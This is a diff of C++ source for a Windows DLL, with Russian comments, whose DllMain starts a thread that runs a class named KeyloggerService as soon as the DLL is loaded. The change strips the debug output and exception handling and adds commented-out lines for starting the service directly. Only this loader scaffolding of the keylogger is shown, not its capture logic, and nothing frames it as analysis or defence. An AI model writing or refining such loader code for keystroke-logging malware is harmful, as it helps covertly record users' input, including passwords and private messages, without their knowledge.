@@ -7,29 +7,12 @@ KeyloggerService* myApp;
 
 DWORD WINAPI myThreadFunc(LPVOID lpParam)
 {
-    OutputDebugString(TEXT("myThreadFunc is running\n"));
     const std::vector<std::string> args;
     myApp = new KeyloggerService();
-    // Инициализируем приложениу
-    try
-    {
-        // Инициализируем приложение
-        //myApp.initialize();
 
-        // Запускаем приложение
-        //myApp.initialize();
-        myApp->main();
-        myApp->uninitialize();
-        
-        // Очищаем ресурсы
-        //myApp.uninitialize();
-    }
-    catch (std::exception e)
-    {
-        std::string s = std::string(e.what());
-        std::wstring str = std::wstring(s.begin(), s.end());
-        OutputDebugString(str.c_str());
-    }
+    // Инициализируем приложениу
+    myApp->main();
+
     // Ожидаем событие на освобождение ресурсов
     WaitForSingleObject(hEvent, INFINITE);
     if (myApp)delete myApp;
@@ -46,7 +29,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     case DLL_PROCESS_ATTACH:
         // Создаем событие
         hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+        //myApp = new KeyloggerService();
 
+        // Инициализируем приложениу
+        //myApp->main();
         // Создаем поток, который будет выполнять бесконечную функцию
         hThread = CreateThread(NULL, 0, myThreadFunc, NULL, 0, NULL);
         
